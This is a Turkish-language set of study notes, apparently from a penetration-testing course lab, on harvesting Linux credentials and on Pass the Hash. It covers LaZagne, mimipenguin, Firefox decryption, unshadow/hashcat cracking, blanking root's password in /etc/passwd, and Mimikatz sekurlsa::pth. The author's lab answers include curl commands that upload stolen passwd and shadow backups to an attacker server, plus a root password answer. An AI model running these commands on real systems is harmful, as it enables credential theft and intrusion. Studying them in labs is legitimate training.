File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

Cronjob'lar komutların, programların, scriptlerin bağımsız olarak yürütülmesidir. Bunlar sistem genelindeki alan (`/etc/crontab`) ve kullanıcıya bağlı yürütmeler olarak ikiye ayrılır. Bazı uygulamalar ve komut dosyaları çalıştırmak için kimlik bilgileri gerektirir ve bu nedenle cronjob'lara yanlış girilir. Ayrıca, farklı zaman aralıklarına bölünmüş alanlar vardır (`/etc/cron.daily`, `/etc/cron` `.hourly`, `/etc/cron` `.monthly`, `/etc/cron.weekly`). `Cron` tarafından kullanılan scriptler ve dosyalar Debian tabanlı dağıtımlar için `/etc/cron.d/` içinde de bulunabilir.


#### Cronjobs

```shell-session
cry0l1t3@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```shell-session
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

SSH anahtarları, SSH protokolünde kullanılan açık anahtar kimlik doğrulama yönteminin bir "giriş kartı" olarak düşünülebilir. İstemci için bir private key ve sunucu için buna karşılık gelen bir public key oluşturulur. Ancak bu anahtarlar aynı değildir; public key'i bilmek, private key'i hesaplamak için yeterli değildir.

Public key, private key tarafından oluşturulan imzaları doğrular ve böylece sunucuya parola girmeden giriş yapılmasını sağlar. Yetkisiz kişiler public key'i ele geçirse bile, bu bilgiyle private key'i bulmak neredeyse imkansızdır. Private key kullanılarak sunucuya bağlanıldığında, sunucu bu anahtarın geçerli olup olmadığını kontrol eder ve oturum açmaya izin verir.

SSH anahtarları istenilen şekilde adlandırılabildiğinden, isimlerinden yola çıkarak bulmak zor olabilir. Ancak, private ve public key'ler benzersiz ilk satırları sayesinde ayırt edilebilir.

#### SSH Private Keys

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

#### SSH Public Keys

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

#### History
Tüm history dosyaları, proseslerin mevcut ve geçmiş/tarihsel seyri hakkında önemli bilgiler sağlar. Biz kullanıcıların komut geçmişini saklayan dosyalar ve sistem prosesleri hakkında bilgi saklayan loglar ile ilgileniyoruz.

Bash'i standart bir shell olarak kullanan Linux dağıtımlarında girilen komutların geçmişinde .bash_history dosyasında ilgili dosyaları buluruz. Bununla birlikte, .bashrc veya .bash_profile gibi diğer dosyalar da önemli bilgiler içerebilir.



#### Bash History

```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```


### Logs
Linux sistemlerinin temel kavramlarından biri metin dosyalarında saklanan log dosyalarıdır. Birçok program, özellikle tüm servisler ve sistemin kendisi bu tür dosyalar yazar. Bu dosyalarda sistem hatalarını bulur, hizmetlerle ilgili sorunları tespit eder ya da sistemin arka planda ne yaptığını takip ederiz. Günlük dosyalarının tamamı dört kategoriye ayrılabilir:

![Pasted image 20241104012559.png](/img/user/resimler/Pasted%20image%2020241104012559.png)

Sistemde birçok farklı günlük mevcuttur. Bunlar yüklü uygulamalara bağlı olarak değişebilir, ancak burada en önemlilerinden bazıları verilmiştir:

![Pasted image 20241104012649.png](/img/user/resimler/Pasted%20image%2020241104012649.png)

Bu log dosyalarının analizini ayrıntılı olarak ele almak bu durumda verimsiz olacaktır. Bu nedenle bu noktada, önce manuel olarak inceleyerek ve formatlarını anlayarak kendimizi tek tek günlüklere alıştırmalıyız. Bununla birlikte, günlüklerde ilginç içerik bulmak için kullanabileceğimiz bazı dizeler vardır:

```shell-session
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```


### Memory and Cache
Birçok uygulama ve proses, kimlik doğrulama için gereken kimlik bilgileriyle çalışır ve bunları tekrar kullanılabilmeleri için bellekte veya dosyalarda saklar. Örneğin, oturum açan kullanıcılar için sistem tarafından istenen kimlik bilgileri olabilir. Bir başka örnek de tarayıcılarda saklanan ve okunabilen kimlik bilgileridir. Linux dağıtımlarından bu tür bilgileri almak için, tüm prosesi kolaylaştıran mimipenguin adında bir araç vardır. Ancak, bu araç yönetici/root izinleri gerektirir.


#### Memory - Mimipenguin

```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Daha önce Windows'ta Kimlik Bilgisi Avlama bölümünde bahsettiğimiz, kullanabileceğimiz daha da güçlü bir araç LaZagne'dir. Bu araç çok daha fazla kaynağa erişmemizi ve kimlik bilgilerini çıkarmamızı sağlar. Elde edebileceğimiz parolalar ve hash'ler aşağıdaki kaynaklardan gelir, ancak bunlarla sınırlı değildir:

![Pasted image 20241104013232.png](/img/user/resimler/Pasted%20image%2020241104013232.png)

Örneğin, Linux dağıtımlarında parolaların güvenli bir şekilde saklanması ve yönetilmesi için Keyrings kullanılır. Parolalar şifrelenmiş olarak saklanır ve bir master parola ile korunur. Bu, daha sonra başka bir bölümde tartışacağımız işletim sistemi tabanlı bir parola yöneticisidir. Bu şekilde, her bir parolayı hatırlamamız gerekmez ve tekrarlanan parola girişlerini kaydedebiliriz.


#### Memory - LaZagne

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```


### Browsers
Tarayıcılar, kullanıcı tarafından kaydedilen parolaları tekrar kullanılmak üzere sistemde yerel olarak şifrelenmiş bir biçimde saklar. Örneğin, Mozilla Firefox tarayıcısı kimlik bilgilerini ilgili kullanıcı için gizli bir klasörde şifrelenmiş olarak saklar. Bunlar genellikle ilişkili alan adlarını, URL'leri ve diğer değerli bilgileri içerir.

Örneğin, Firefox tarayıcısında bir web sayfası için kimlik bilgilerini sakladığımızda, bunlar şifrelenir ve sistemdeki logins.json dosyasında saklanır. Ancak bu, orada güvende oldukları anlamına gelmez. Birçok çalışan bu tür oturum açma verilerini, kolayca şifrelerinin çözülebileceğinden ve şirkete karşı kullanılabileceğinden şüphelenmeden tarayıcılarında saklar.


#### Firefox Stored Credentials

```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell-session
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

[Firefox Decrypt](https://github.com/unode/firefox_decrypt) aracı bu kimlik bilgilerinin şifresini çözmek için mükemmeldir ve düzenli olarak güncellenir. En son sürümü çalıştırmak için Python 3.9 gerektirir. Aksi takdirde, Python 2 ile Firefox Decrypt 0.7.0 kullanılmalıdır.


#### Decrypting Firefox Credentials

```shell-session
[!bash!]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternatif olarak LaZagne, kullanıcı desteklenen tarayıcıyı kullandıysa da sonuç döndürebilir.

#### Browsers - LaZagne

```shell-session
cry0l1t3@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```


Soru : Hedefi inceleyin ve Will kullanıcısının şifresini bulun. Ardından, şifreyi cevap olarak gönderin.
Cevap :

1- ssh portuna bruteforce

2- ssh ile bağlandıktansonra LaZagne 'yi hedef host'a transfer ettik . 

3-
![Pasted image 20241104015702.png](/img/user/resimler/Pasted%20image%2020241104015702.png)


# Passwd, Shadow & Opasswd

Linux tabanlı dağıtımlar birçok farklı kimlik doğrulama mekanizması kullanabilir. En yaygın kullanılan ve standart mekanizmalardan biri Pluggable Authentication Modules (PAM)'dir. Bunun için kullanılan modüller pam_unix.so veya pam_unix2.so olarak adlandırılır ve Debian tabanlı dağıtımlarda /usr/lib/x86_x64-linux-gnu/security/ içinde bulunur. Bu modüller kullanıcı bilgilerini, kimlik doğrulamayı, oturumları, geçerli parolaları ve eski parolaları yönetir. Örneğin passwd ile Linux sistemindeki hesabımızın şifresini değiştirmek istediğimizde PAM çağrılır ve uygun önlemleri alarak bilgileri buna göre saklar ve işler.

Yönetim için pam_unix.so standart modülü, hesap bilgilerini güncellemek için sistem kütüphanelerinden ve dosyalardan standartlaştırılmış API çağrılarını kullanır. Okunan, yönetilen ve güncellenen standart dosyalar /etc/passwd ve /etc/shadow'dur. PAM ayrıca LDAP, mount veya Kerberos gibi birçok başka hizmet modülüne de sahiptir.

### Passwd File
etc/passwd dosyası sistemdeki mevcut her kullanıcı hakkında bilgi içerir ve tüm kullanıcılar ve servisler tarafından okunabilir. etc/passwd dosyasındaki her girdi sistemdeki bir kullanıcıyı tanımlar. Her girdide, iki nokta üst üste (:) işaretinin bilgileri ayırdığı, söz konusu kullanıcı hakkında bilgi içeren bir veritabanı formunu içeren yedi alan bulunur. Buna göre, böyle bir girdi aşağıdaki gibi görünebilir:

#### Passwd Format

![Pasted image 20241104033736.png](/img/user/resimler/Pasted%20image%2020241104033736.png)

Bizim için en ilginç alan bu bölümdeki Parola bilgisi alanıdır çünkü burada farklı girişler olabilir. Sadece çok eski sistemlerde rastlayabileceğimiz nadir durumlardan biri bu alanda şifrelenmiş parolanın hash değerinin bulunmasıdır. Modern sistemlerde hash değerleri /etc/shadow dosyasında saklanır ki bu konuya daha sonra tekrar döneceğiz. Bununla birlikte, /etc/passwd sistem genelinde okunabilir olduğundan, hash'ler burada saklanırsa saldırganlara şifreleri kırma imkanı verir.

Genellikle bu alanda x değerini buluruz, bu da parolaların /etc/shadow dosyasında şifrelenmiş bir biçimde saklandığı anlamına gelir. Ancak, /etc/passwd dosyasının yanlışlıkla yazılabilir olması da mümkündür. Bu, parola bilgisi alanının boş olması için root kullanıcısı için bu alanı temizlememize izin verir. Bu, bir kullanıcı root olarak oturum açmaya çalıştığında sistemin bir parola istemi göndermemesine neden olacaktır.

#### Editing /etc/passwd - Before
```shell-session
root:x:0:0:root:/root:/bin/bash
```

#### Editing /etc/passwd - After
```shell-session
root::0:0:root:/root:/bin/bash
```

#### Root without Password

```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

Gösterilen durumlar nadiren gerçekleşecek olsa da, tüm klasörler için belirli izinler ayarlamamızı gerektiren uygulamalar olduğundan, yine de güvenlik açıklarına dikkat etmeli ve izlemeliyiz. Eğer yöneticinin Linux ya da uygulamalar ve bunların bağımlılıkları konusunda çok az deneyimi varsa, yönetici /etc dizinine yazma izinleri verebilir ve bunları düzeltmeyi unutabilir.


### Shadow File
Parola hash değerlerinin okunması tüm sistemi tehlikeye atabileceğinden, /etc/passwd ile benzer bir formata sahip olan ancak yalnızca parolalardan ve bunların yönetiminden sorumlu olan /etc/shadow dosyası geliştirilmiştir. Oluşturulan kullanıcılar için tüm parola bilgilerini içerir. Örneğin, /etc/passwd'deki bir kullanıcı için /etc/shadow dosyasında herhangi bir giriş yoksa, kullanıcı geçersiz kabul edilir. etc/shadow dosyası da sadece yönetici haklarına sahip kullanıcılar tarafından okunabilir. Bu dosyanın biçimi dokuz alana bölünmüştür:

#### Shadow Format
![Pasted image 20241104033959.png](/img/user/resimler/Pasted%20image%2020241104033959.png)

#### Shadow File

```shell-session
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

Parola alanı ! veya * gibi bir karakter içeriyorsa, kullanıcı Unix parolasıyla oturum açamaz. Ancak, oturum açmak için Kerberos veya key tabanlı kimlik doğrulama gibi diğer kimlik doğrulama yöntemleri kullanılabilir. Aynı durum şifrelenmiş parola alanı boşsa da geçerlidir. Bu, oturum açmak için parola gerekmediği anlamına gelir. Ancak, belirli programların fonksiyonlara erişimi reddetmesine yol açabilir. Şifrelenmiş parolanın ayrıca bazı bilgileri de bulabileceğimiz belirli bir biçimi vardır:

- `$<type>$<salt>$<hashed>`

Burada görebileceğimiz gibi, şifrelenmiş parolalar üç bölüme ayrılmıştır. Şifreleme türleri aşağıdakiler arasında ayrım yapmamızı sağlar:

#### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

En yeni Linux dağıtımlarında varsayılan olarak SHA-512 ($6$) şifreleme yöntemi kullanılır. Daha sonra eski sistemlerde kırmayı deneyebileceğimiz diğer şifreleme yöntemlerini de bulacağız. Kırma işleminin nasıl çalıştığını birazdan tartışacağız.


## Opasswd
PAM kütüphanesi (pam_unix.so) eski parolaların tekrar kullanılmasını önleyebilir. Eski parolaların saklandığı dosya /etc/security/opasswd dosyasıdır. Bu dosyanın izinleri manuel olarak değiştirilmemişse dosyayı okumak için administrator/root izinleri de gereklidir.

#### Reading /etc/security/opasswd

```shell-session
M1R4CKCK@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Bu dosyanın içeriğine baktığımızda, cry0l1t3 kullanıcısı için virgül (,) ile ayrılmış birkaç giriş içerdiğini görebiliriz. Dikkat edilmesi gereken bir diğer kritik nokta da kullanılan hashing türüdür. Bunun nedeni MD5 ($1$) algoritmasının kırılmasının SHA-512'den çok daha kolay olmasıdır. Bu özellikle eski parolaları ve hatta parolaların modelini belirlemek için önemlidir çünkü parolalar genellikle birden fazla hizmet ya da uygulamada kullanılır. Doğru parolayı tahmin etme olasılığını, parolanın desenine bağlı olarak birçok kez artırıyoruz.


### Cracking Linux Credentials
Bazı hash'leri topladıktan sonra, şifreleri açık metin olarak elde etmek için bunları farklı şekillerde kırmayı deneyebiliriz.


#### Unshadow
```shell-session
M1R4CKCK@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
M1R4CKCK@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
M1R4CKCK@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes

```shell-session
M1R4CKCK@htb[/htb]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```


Soru : Kullanıcı Will'deki kimlik bilgilerini kullanarak hedefi inceleyin ve “root” kullanıcısının şifresini bulun. Ardından, şifreyi cevap olarak gönderin.
Cevap : J0rd@n5

1- ssh ile bağlan 
2- etc/passwd'de bişey yok 
3- etc/shadow dosyasını açmaya çalışıyorum, ancak Will'in yönetici hakları olmadığı için açamıyorum
4- sonra mevcut dosyaları görmek istiyorum, giriyorum
5- .bash_history dosyasını görüyorum . . backup'lar dikkatimi çekiyor
![Pasted image 20241104034540.png](/img/user/resimler/Pasted%20image%2020241104034540.png)

6-passwd.bak , shadow.bach /etc/passwd , /etc/shadow yedeklerini buldum
7-daha sonra bu dosyaları saldırı makineme aktaracak ve ardından hash'leri kıracak , önce saldırı makinemde upload sunucusunu başlatıyorum


```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'  
mkdir https && cd https  
sudo python3 -m uploadserver 443 --server-certificate ../server.pem  
File upload available at /upload
```

![Pasted image 20241104034643.png](/img/user/resimler/Pasted%20image%2020241104034643.png)

daha sonra dosyaları ele geçirilen makinede curl kullanarak aktarıyorum,

```shell-session
curl -X POST https://10.10.16.14/upload -F 'files=@passwd.bak' --insecure  
curl -X POST https://10.10.16.14/upload -F 'files=@shadow.bak' --insecure
```


sonra dosyaları kırmaya çalışıyorum


```shell-session
sudo unshadow passwd.bak shadow.bak > unshadowed.hashes  
hashcat -m 1800 -a 0 unshadowed.hashes /usr/share/wordlists/rockyou.txt -o unshadowed.cracked
```
rockyou.txt kelime listesi ile uzun zaman alıyor

ayrıca kaynaktan password.list'i deniyorum ve çalışmıyor.

bunun için password.list'in mutasyonunu kullanıyorum


```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list  
hashcat -m 1800 -a 0 unshadowed.hashes ./mut_password.list
```

finnaly i get it

![Pasted image 20241104034827.png](/img/user/resimler/Pasted%20image%2020241104034827.png)



### Pass the Hash (PtH)
[Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) saldırısı, saldırganın kimlik doğrulama için düz metin parolası yerine bir parola hash'i kullandığı bir tekniktir. Saldırganın düz metin parolasını elde etmek için hash'in şifresini çözmesi gerekmez. PtH saldırıları, parola değiştirilene kadar parola hash'i her oturum için statik kaldığından kimlik doğrulama protokolünden faydalanır.

Önceki bölümlerde tartışıldığı gibi, saldırganın bir parola hash'i elde etmek için hedef makinede yönetici ayrıcalıklarına veya belirli ayrıcalıklara sahip olması gerekir. Hash'ler aşağıdakiler de dahil olmak üzere çeşitli yollarla elde edilebilir:

- Güvenliği ihlal edilmiş bir hosttan local SAM veritabanını boşaltma.  
- Domain Controller üzerindeki NTDS veritabanından (ntds.dit) hash'lerin çıkarılması.  
- Hash'leri bellekten çekme (lsass.exe).

`inlanefreight.htb` domaininden `julio` hesabı için şifre hashini (`64F12CDDAA88057E06A81B54E73B949B`) elde ettiğimizi varsayalım. Windows ve Linux makinelerden Pass the Hash saldırılarını nasıl gerçekleştirebileceğimizi görelim.  

**Not:** Kullanacağımız araçlar hedef host üzerinde C:\tools dizininde yer almaktadır. Makineyi başlattıktan ve alıştırmaları tamamladıktan sonra, bu dizindeki araçları kullanabilirsiniz. Bu laboratuvar iki makine içeriyor, birine (MS01) erişiminiz olacak ve oradan ikinci makineye (DC01) bağlanacaksınız.

`inlanefreight.htb` domaininden `julio` hesabı için şifre hashini (`64F12CDDAA88057E06A81B54E73B949B`) elde ettiğimizi varsayalım. Windows ve Linux makinelerden Pass the Hash saldırılarını nasıl gerçekleştirebileceğimizi görelim.  

**Not:** Kullanacağımız araçlar hedef host üzerinde C:\tools dizininde yer almaktadır. Makineyi başlattıktan ve alıştırmaları tamamladıktan sonra, bu dizindeki araçları kullanabilirsiniz. Bu laboratuvar iki makine içeriyor, birine (MS01) erişiminiz olacak ve oradan ikinci makineye (DC01) bağlanacaksınız.


## Windows NTLM Introduction
Microsoft'un [Windows Yeni Teknoloji LAN Yöneticisi (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview), kullanıcıların kimliklerini doğrularken aynı zamanda verilerinin bütünlüğünü ve gizliliğini koruyan bir dizi güvenlik protokolüdür. NTLM, kullanıcının kimliğini parola girmesine gerek kalmadan doğrulamak için bir challenge-response protokolü kullanan bir single sign-on (SSO) çözümüdür.  

Bilinen kusurlarına rağmen NTLM, modern sistemlerde bile eski client ve sunucularla uyumluluğu sağlamak için hala yaygın olarak kullanılmaktadır. Microsoft NTLM'yi desteklemeye devam ederken, Kerberos Windows 2000 ve sonraki Active Directory (AD) domainlerinde varsayılan kimlik doğrulama mekanizması olarak yerini almıştır.  

NTLM ile sunucuda ve domain controller'da depolanan parolalar " salted" değildir, bu da parola hash'ine sahip bir saldırganın orijinal parolayı bilmeden bir oturumun kimliğini doğrulayabileceği anlamına gelir. Buna `Pass the Hash (PtH) Saldırısı` adını veriyoruz.


## **Mimikatz ile Pass the Hash (Windows)**  

Pass the Hash saldırısı gerçekleştirmek için kullanacağımız ilk araç [Mimikatz](https://github.com/gentilkiwi)'dır. Mimikatz'ın `sekurlsa::pth` adında bir modülü vardır ve bu modül kullanıcının parolasının hash'ini kullanarak bir proses başlatarak Pass the Hash saldırısı gerçekleştirmemizi sağlar. Bu modülü kullanmak için aşağıdakilere ihtiyacımız olacak:

- /`user` - Taklit etmek istediğimiz kullanıcı adı.  
    
- `/rc4` veya `/NTLM` - Kullanıcının şifresinin NTLM hash'i.  
    
- `/domain` - Taklit edilecek kullanıcının ait olduğu domain. Lokal bir kullanıcı hesabı söz konusu olduğunda, bilgisayar adını, localhost'u veya bir nokta (.) kullanabiliriz.  
    
- `/run` - Kullanıcının bağlamıyla çalıştırmak istediğimiz program (belirtilmezse cmd.exe'yi başlatır).

#### Pass the Hash from Windows Using Mimikatz:

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```


1. **`privilege::debug`**: Mimikatz'in "debug" yetkisini almasını sağlar. Bu yetki, processler üzerinde daha fazla erişim sağlar ve genellikle "sekurlsa" modülünün çalışabilmesi için gereklidir.
    
2. **`sekurlsa::pth`**: Mimikatz'in "Pass-the-Hash" (PTH) saldırısını gerçekleştirmesini sağlar. PTH, kullanıcı şifresi yerine hash değeri ile kimlik doğrulama yaparak oturum açmayı sağlar.
    
3. **`/user:julio`**: Kimliğini taklit etmek istediğiniz kullanıcı adı. Burada "julio" adlı kullanıcı taklit edilmektedir.
    
4. **`/rc4:64F12CDDAA88057E06A81B54E73B949B`**: Kullanıcının NTLM hash değeri. Bu hash, parola yerine kullanılmaktadır. NTLM hash değeri, RC4 algoritması ile şifrelenmiş olup kimlik doğrulama amacıyla kullanılır.
    
5. **`/domain:inlanefreight.htb`**: Kullanıcının domain adı. Burada hedef sistemdeki domain adı olarak "inlanefreight.htb" kullanılmış.
    
6. **`/run:cmd.exe`**: Belirtilen kimlik bilgileriyle çalıştırılacak komutu tanımlar. Bu örnekte "cmd.exe" çalıştırılmakta, yani kimlik doğrulandıktan sonra bir komut istemi açılır.
    
7. **`exit`**: Komutun sonunda "exit" ifadesi, Mimikatz'in otomatik olarak kapanmasını sağlar.
    

Bu komut ile, NTLM hash değeri kullanarak bir Pass-the-Hash saldırısı yapılıyor. Elde edilen yetkiyle, belirtilen kullanıcı (julio) kimliğinde "cmd.exe" çalıştırılarak sistemde yetkili bir oturum açılıyor.

Artık komutları kullanıcının bağlamında çalıştırmak için cmd.exe'yi kullanabiliriz. Bu örnek için `julio`, DC'de `julio` adlı paylaşılan bir klasöre bağlanabilir.

![Pasted image 20241104172537.png](/img/user/resimler/Pasted%20image%2020241104172537.png)


## Pass the Hash with PowerShell Invoke-TheHash (Windows)
